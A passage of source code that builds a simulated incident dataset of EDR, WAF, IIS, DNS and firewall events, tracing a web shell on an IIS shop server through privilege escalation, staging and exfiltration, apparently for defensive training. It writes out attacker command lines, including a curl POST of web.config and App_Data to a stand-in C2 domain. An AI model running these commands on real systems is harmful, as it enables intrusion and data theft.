        path: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\bootstrap.bundle.aspx",
        sha256: shellHash,
        size: 8917,
        extension: "aspx",
      },
      description:
        "Defender for Endpoint recorded w3wp.exe, running as IIS APPPOOL\\ShopPortal, creating bootstrap.bundle.aspx in the site's JavaScript vendor directory.",
      raw: {
        Timestamp: "2026-03-17T09:47:01.133Z",
        DeviceName: "web-shop-01.nexacorp.com",
        DeviceId: "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2",
        ActionType: "FileCreated",
        FileName: "bootstrap.bundle.aspx",
        FolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\bootstrap.bundle.aspx",
        SHA256: shellHash,
        FileSize: "8917",
        InitiatingProcessFileName: "w3wp.exe",
        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
        InitiatingProcessCommandLine: W3WP_CMD,
        InitiatingProcessId: "6188",
        InitiatingProcessAccountDomain: "IIS APPPOOL",
        InitiatingProcessAccountName: "ShopPortal",
        InitiatingProcessIntegrityLevel: "High",
        InitiatingProcessTokenElevation: "TokenElevationTypeDefault",
        ReportId: "44127",
      },
    },

    wafAllow("evt_11a_waf_allow_post", 51 * MIN + 59_600, {
      method: "POST", uri: shellUrlPath, args: "", length: 418, requestId: "1-67d856a7-0d5c3e91b8a24f7611c9e035",
      description: "AWS WAF returned ALLOW on a 418-byte POST to /assets/js/vendor/bootstrap.bundle.aspx from 91.242.229.35, Chrome browser User-Agent.",
    }),

    // ── EXECUTION: first command through the shell, at the app pool's level ───
    {
      id: "evt_12_webshell_command",
      ts: T(52 * MIN),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "process_create",
      hostname: web.hostname,
      severity: "critical",
      mitre_technique: "T1059.003",
      mitre_tactic: "Execution",
      process: {
        name: "cmd.exe",
        pid: 7304,
        path: "C:\\Windows\\System32\\cmd.exe",
        parent_name: "w3wp.exe",
        parent_pid: 6188,
        cmdline: "cmd.exe /c whoami /priv & hostname & ipconfig /all",
        user: "IIS APPPOOL\\ShopPortal",
        integrity: "high",
      },
      description:
        "w3wp.exe spawned cmd.exe on WEB-SHOP-01, running whoami /priv, hostname and ipconfig /all in a single chained command line.",
      raw: {
        Timestamp: "2026-03-17T09:52:00.740Z",
        DeviceName: "web-shop-01.nexacorp.com",
        DeviceId: "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2",
        ActionType: "ProcessCreated",
        FileName: "cmd.exe",
        FolderPath: "C:\\Windows\\System32\\cmd.exe",
        ProcessCommandLine: "cmd.exe /c whoami /priv & hostname & ipconfig /all",
        ProcessId: "7304",
        ProcessIntegrityLevel: "High",
        ProcessTokenElevation: "TokenElevationTypeDefault",
        AccountDomain: "IIS APPPOOL",
        AccountName: "ShopPortal",
        AccountSid: "S-1-5-82-1274839021-3315088842-4194903328-2971184652-1108255477",
        InitiatingProcessFileName: "w3wp.exe",
        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
        InitiatingProcessId: "6188",
        InitiatingProcessAccountDomain: "IIS APPPOOL",
        InitiatingProcessAccountName: "ShopPortal",
        InitiatingProcessIntegrityLevel: "High",
        ReportId: "44503",
      },
    },

    shellCall("evt_12_iis_post_1", 52 * MIN + 2_100, "2026-03-17T09:52:02.108Z", {
      scBytes: 1186, csBytes: 418, taken: 2204,
      description: "IIS answered a POST to /assets/js/vendor/bootstrap.bundle.aspx with 200, 1,186 bytes returned in 2,204 ms.",
    }),

    {
      ...mdeAlert({
        ...cx, id: "evt_12_edr_alert", ts: T(52 * MIN + 20_000), host: web.hostname, srcIp: web.ip, user: null,
        alertTitle: "Suspicious process spawned by IIS worker (possible web shell)", category: "Execution", mitre: "T1059.003",
        techniqueName: "Windows Command Shell", detectionSource: "EDR", alertSeverity: "High", severity: "high",
        extra: {
          "AccountName": "ShopPortal", "AccountDomain": "IIS APPPOOL", "FileName": "cmd.exe", "ProcessId": "7304",
          "mde.DeviceName": DEVICE_NAME, "mde.EntityType": "Process", "mde.AlertStatus": "New", "mde.ServiceSource": "Microsoft Defender for Endpoint", "ReportId": "44521",
        },
        description:
          "Defender for Endpoint raised a High-severity alert on WEB-SHOP-01: the IIS worker process w3wp.exe spawned cmd.exe (pid 7304).",
      }),
      edr_scope: "edr",   // server-primary RCE incident → investigated in the EDR console
    },

    wafAllow("evt_12a_waf_allow_post", 55 * MIN - 400, {
      method: "POST", uri: "/admin/content/upload.ashx", args: "key=d0f4a1c8-7b23-4e19-9a56-cc81e0b47f3d&target=assets%2Fjs%2Fvendor&name=srv.exe",
      contentType: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW", length: 7842, requestId: "1-67d85a83-71e4c2f09b6d3a5818ef2c40",
      description: "AWS WAF returned ALLOW on a 7,842-byte POST to /admin/content/upload.ashx from 91.242.229.35, Chrome browser User-Agent.",
    }),

    // ── DELIVERY: the privesc tool goes up through the same legacy handler ────
    {
      id: "evt_12a_srv_upload",
      ts: T(55 * MIN),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "http_request",
      hostname: web.hostname,
      dst_ip: web.ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1105",
      mitre_tactic: "Command and Control",
      network: { url: `https://${web.site}/admin/content/upload.ashx`, domain: web.site, method: "POST", status: 201, user_agent: uaChrome },
      description:
        "A second POST to /admin/content/upload.ashx, using the same disclosed key, was accepted with 201 — target assets/js/vendor, name srv.exe.",
      raw: {
        TimeGenerated: "2026-03-17T09:55:00.612Z",
        Computer: "WEB-SHOP-01.nexacorp.com",
        sSiteName: "SHOPPORTAL",
        sComputerName: "WEB-SHOP-01",
        sIP: "10.40.12.21",
        sPort: "443",
        csMethod: "POST",
        csUriStem: "/admin/content/upload.ashx",
        csUriQuery:
          "key=d0f4a1c8-7b23-4e19-9a56-cc81e0b47f3d&target=assets%2fjs%2fvendor&name=srv.exe",
        csUserName: "-",
        cIP: albIp,
        csHost: "shop.nexacorp.com",
        csUserAgent: uaChrome,
        csReferer: "-",
        scStatus: "201",
        scSubStatus: "0",
        scWin32Status: "0",
        scBytes: "412",
        csBytes: "7842",
        TimeTaken: "134",
        csVersion: "HTTP/1.1",
        Type: "W3CIISLog",
      },
    },

    // ── PERSISTENCE: the privesc tool lands on disk, written by the app pool ──
    {
      id: "evt_12b_srv_written",
      ts: T(55 * MIN + 1_000),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "file_create",
      hostname: web.hostname,
      severity: "critical",
      mitre_technique: "T1105",
      mitre_tactic: "Command and Control",
      file: {
        name: "srv.exe",
        path: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\srv.exe",
        sha256: spoofHash,
        size: 7168,
        extension: "exe",
      },
      description:
        "Defender for Endpoint recorded w3wp.exe, still running as IIS APPPOOL\\ShopPortal, creating srv.exe in the same vendor asset folder as the web shell.",
      raw: {
        Timestamp: "2026-03-17T09:55:01.088Z",
        DeviceName: "web-shop-01.nexacorp.com",
        DeviceId: "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2",
        ActionType: "FileCreated",
        FileName: "srv.exe",
        FolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\srv.exe",
        SHA256: spoofHash,
        FileSize: "7168",
        InitiatingProcessFileName: "w3wp.exe",
        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
        InitiatingProcessCommandLine: W3WP_CMD,
        InitiatingProcessId: "6188",
        InitiatingProcessAccountDomain: "IIS APPPOOL",
        InitiatingProcessAccountName: "ShopPortal",
        InitiatingProcessIntegrityLevel: "High",
        InitiatingProcessTokenElevation: "TokenElevationTypeDefault",
        ReportId: "44718",
      },
    },

    wafAllow("evt_12c_waf_allow_post", 57 * MIN + 19_600, {
      method: "POST", uri: shellUrlPath, args: "", length: 463, requestId: "1-67d85c2f-5a0b91d3e7c24f6812ab9d37",
      description: "AWS WAF returned ALLOW on a 463-byte POST to /assets/js/vendor/bootstrap.bundle.aspx from 91.242.229.35, Chrome browser User-Agent.",
    }),
    mdeRow("evt_12c_cmd_run_srv", T(57 * MIN + 20_000), {
      name: "cmd.exe", path: `${sys32}cmd.exe`, cmdline: `cmd.exe /c ${vendorDir}\\srv.exe -i -c cmd.exe`, parent: "w3wp.exe", parentPid: 6188, pid: 7612,
      sha: hashes.cmd, mitre: "T1059.003", tactic: "Execution", severity: "medium",
      description: "w3wp.exe spawned cmd.exe (pid 7612) on WEB-SHOP-01, running the uploaded srv.exe from the vendor asset folder.",
    }),
    mdeRow("evt_12d_srv_run", T(57 * MIN + 21_000), {
      name: "srv.exe", path: `${vendorDir}\\srv.exe`, cmdline: "srv.exe -i -c \"cmd.exe\"", parent: "cmd.exe", parentPid: 7612, pid: 7952,
      sha: spoofHash, signed: false, mitre: "T1134.001", tactic: "Privilege Escalation", severity: "high",
      description: "srv.exe started on WEB-SHOP-01 from the vendor asset folder as IIS APPPOOL\\ShopPortal, parent cmd.exe (pid 7612).",
    }),
    shellCall("evt_12e_iis_post_2", 57 * MIN + 22_000, "2026-03-17T09:57:22.031Z", {
      scBytes: 874, csBytes: 463, taken: 2411,
      description: "IIS answered a POST to /assets/js/vendor/bootstrap.bundle.aspx with 200, 874 bytes returned in 2,411 ms.",
    }),

    // ── ESCALATION: SeImpersonatePrivilege from evt_01 is cashed in ───────────
    {
      id: "evt_13_srv_child_cmd",
      ts: T(58 * MIN),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "privilege_escalation",
      hostname: web.hostname,
      severity: "critical",
      mitre_technique: "T1134.001",
      mitre_tactic: "Privilege Escalation",
      process: {
        name: "cmd.exe",
        pid: 8016,
        path: "C:\\Windows\\System32\\cmd.exe",
        parent_name: "srv.exe",
        parent_pid: 7952,
        cmdline: "cmd.exe",
        user: "NT AUTHORITY\\SYSTEM",
        integrity: "system",
      },
      description:
        "srv.exe, run from the site's vendor asset folder by the app pool account, spawned a child cmd.exe running as NT AUTHORITY\\SYSTEM at System integrity.",
      raw: {
        Timestamp: "2026-03-17T09:58:00.318Z",
        DeviceName: "web-shop-01.nexacorp.com",
        DeviceId: "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2",
        ActionType: "ProcessCreated",
        FileName: "cmd.exe",
        FolderPath: "C:\\Windows\\System32\\cmd.exe",
        ProcessCommandLine: "cmd.exe",
        ProcessId: "8016",
        ProcessIntegrityLevel: "System",
        ProcessTokenElevation: "TokenElevationTypeDefault",
        AccountDomain: "NT AUTHORITY",
        AccountName: "SYSTEM",
        AccountSid: "S-1-5-18",
        InitiatingProcessFileName: "srv.exe",
        InitiatingProcessFolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\srv.exe",
        InitiatingProcessCommandLine: "srv.exe -i -c \"cmd.exe\"",
        InitiatingProcessId: "7952",
        InitiatingProcessSHA256: spoofHash,
        InitiatingProcessAccountDomain: "IIS APPPOOL",
        InitiatingProcessAccountName: "ShopPortal",
        InitiatingProcessIntegrityLevel: "High",
        InitiatingProcessTokenElevation: "TokenElevationTypeDefault",
        ReportId: "44861",
      },
    },

    // ── STAGING: the SYSTEM shell packs the files it wants ───────────────────
    wafAllow("evt_13a_waf_allow_post", 61 * MIN + 38_600, {
      method: "POST", uri: shellUrlPath, args: "", length: 529, requestId: "1-67d85dd2-3c8e0a57f1b64d9923c7e810",
      description: "AWS WAF returned ALLOW on a 529-byte POST to /assets/js/vendor/bootstrap.bundle.aspx from 91.242.229.35, Chrome browser User-Agent.",
    }),
    mdeRow("evt_13b_tar_run", T(61 * MIN + 40_000), {
      name: "tar.exe", path: `${sys32}tar.exe`,
      cmdline: "tar.exe -cf C:\\Windows\\Temp\\ib.dat -C C:\\inetpub\\wwwroot\\shop web.config App_Data",
      parent: "cmd.exe", parentPid: 8016, pid: 8148, sha: hashes.tar, system: true, parentSystem: true, mitre: "T1560.001", tactic: "Collection", severity: "medium",
      description: "tar.exe (pid 8148), a child of the SYSTEM cmd.exe, packed web.config and App_Data from the shop folder into C:\\Windows\\Temp\\ib.dat.",
    }),
    shellCall("evt_13c_iis_post_3", 61 * MIN + 41_500, "2026-03-17T10:01:41.512Z", {
      scBytes: 301, csBytes: 529, taken: 2894,
      description: "IIS answered a POST to /assets/js/vendor/bootstrap.bundle.aspx with 200, 301 bytes returned in 2,894 ms.",
    }),
    (() => {
      const e = mdeFile({
        ...cx, id: "evt_13d_ib_dat_written", ts: T(61 * MIN + 46_000), host: web.hostname, srcIp: web.ip, user: null,
        path: "C:\\Windows\\Temp\\ib.dat", sha256: null, size: 5_918_204, action: "file_create", initiatingProcess: "tar.exe",
        initiatingCmdline: "tar.exe -cf C:\\Windows\\Temp\\ib.dat -C C:\\inetpub\\wwwroot\\shop web.config App_Data", severity: "medium",
        mitre: "T1560.001", tactic: "Collection",
        description: "ib.dat (5,918,204 bytes) was written to C:\\Windows\\Temp on WEB-SHOP-01 by tar.exe.",
      });
      Object.assign(e.raw, {
        "Timestamp": e.ts, "DeviceName": DEVICE_NAME, "DeviceId": DEVICE_ID, "FolderPath": "C:\\Windows\\Temp\\ib.dat",
        "InitiatingProcessFolderPath": `${sys32}tar.exe`, "InitiatingProcessId": "8148",
        "InitiatingProcessAccountDomain": "NT AUTHORITY", "InitiatingProcessAccountName": "SYSTEM", "InitiatingProcessIntegrityLevel": "System", "ReportId": "45002",
      });
      return e;
    })(),

    // ── EXFIL PRELUDE: the last shell call, the SYSTEM command prompt starts curl ─
    wafAllow("evt_13e_waf_allow_post", 63 * MIN + 53_600, {
      method: "POST", uri: shellUrlPath, args: "", length: 571, requestId: "1-67d85e48-0f9a2b6c83d71e4a05fb3c92",
      description: "AWS WAF returned ALLOW on a 571-byte POST to /assets/js/vendor/bootstrap.bundle.aspx from 91.242.229.35, Chrome browser User-Agent.",
    }),
    mdeRow("evt_13f_curl_start", T(63 * MIN + 55_000), {
      name: "curl.exe", path: `${sys32}curl.exe`,
      cmdline: "curl.exe -k -s -X POST --data-binary @C:\\Windows\\Temp\\ib.dat https://cdn-shopassets.link/u",
      parent: "cmd.exe", parentPid: 8016, pid: 8244, sha: hashes.curl, system: true, parentSystem: true, mitre: "T1041", tactic: "Exfiltration", severity: "high",
      description: "curl.exe (pid 8244), a child of the SYSTEM cmd.exe, was started to POST C:\\Windows\\Temp\\ib.dat to https://cdn-shopassets.link/u.",
    }),
    infobloxDns({
      id: "evt_13g_dns_c2", ts: T(63 * MIN + 56_000), host: web.hostname, srcIp: web.ip,
      query: c2Dom, answer: c2Ip, member: "DNS-DMZ-01",
      description: "WEB-SHOP-01 resolved cdn-shopassets.link to 194.26.29.114, answered NOERROR by the DMZ Infoblox resolver DNS-DMZ-01.",
    }),
    shellCall("evt_13h_iis_post_4", 63 * MIN + 56_500, "2026-03-17T10:03:56.502Z", {
      scBytes: 198, csBytes: 571, taken: 1013,
      description: "IIS answered a POST to /assets/js/vendor/bootstrap.bundle.aspx with 200, 198 bytes returned in 1,013 ms.",
    }),

    // ── EXFIL: the SYSTEM shell ships the staged data out ────────────────────
    {
      id: "evt_14_outbound_upload",
      ts: T(64 * MIN),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "net_connection",
      hostname: web.hostname,
      src_ip: web.ip,
      dst_ip: c2Ip,
      dst_port: 443,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1041",
      mitre_tactic: "Exfiltration",
      network: { url: `https://${c2Dom}/u`, domain: c2Dom, bytes_out: 5918204, bytes_in: 214 },
      description:
        "curl.exe running as SYSTEM POSTed C:\\Windows\\Temp\\ib.dat to https://cdn-shopassets.link/u (194.26.29.114) — 5,918,204 bytes out, 214 in.",
      raw: {
        Timestamp: "2026-03-17T10:04:00.552Z",
        DeviceName: "web-shop-01.nexacorp.com",
        DeviceId: "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2",
        ActionType: "ConnectionSuccess",
        LocalIP: "10.40.12.21",
        LocalPort: "50188",
        RemoteIP: c2Ip,
        RemotePort: "443",
        RemoteUrl: `https://${c2Dom}/u`,
        Protocol: "Tcp",
        InitiatingProcessFileName: "curl.exe",
        InitiatingProcessFolderPath: "C:\\Windows\\System32\\curl.exe",
        InitiatingProcessCommandLine:
          "curl.exe -k -s -X POST --data-binary @C:\\Windows\\Temp\\ib.dat https://cdn-shopassets.link/u",
        InitiatingProcessId: "8244",
        InitiatingProcessAccountDomain: "NT AUTHORITY",
        InitiatingProcessAccountName: "SYSTEM",
        InitiatingProcessIntegrityLevel: "System",
        InitiatingProcessParentFileName: "cmd.exe",
        InitiatingProcessParentId: "8016",
        ReportId: "45119",
      },
    },

    // ── EGRESS: the firewall's session record for the same upload ──────────────
    (() => {
      const e = panConnection({
        ...cx, id: "evt_14a_egress_session", ts: T(64 * MIN + 8_000), host: web.hostname, srcIp: web.ip, user: null,
        dstIp: c2Ip, remotePort: 443, app: "ssl", action: "allow", end: true, category: "unknown",
        bytesOut: 5_931_480, bytesIn: 4_212, elapsedSec: 8, severity: "medium",
        description: "An 8-second outbound TLS session from WEB-SHOP-01 (10.40.12.21) to 194.26.29.114:443 closed, 5,931,480 bytes sent and 4,212 received, allowed by rule DMZ-Servers-Outbound.",
      });
      Object.assign(e.raw, { "pan.rule": "DMZ-Servers-Outbound", "pan.from_zone": "dmz", "pan.to_zone": "untrust", "pan.sport": "50188", "pan.session_id": "7741206" });
      return e;
    })(),
  ];

  // Every event belongs to the one incident.
  for (const e of events) e.incident_id = INCIDENT;

  return { title: "WAF blocks and an EDR alert on the shop", events, T, MIN, web, atkA, atkB, atkC, c2Ip, c2Dom, shellHash, spoofHash };
}
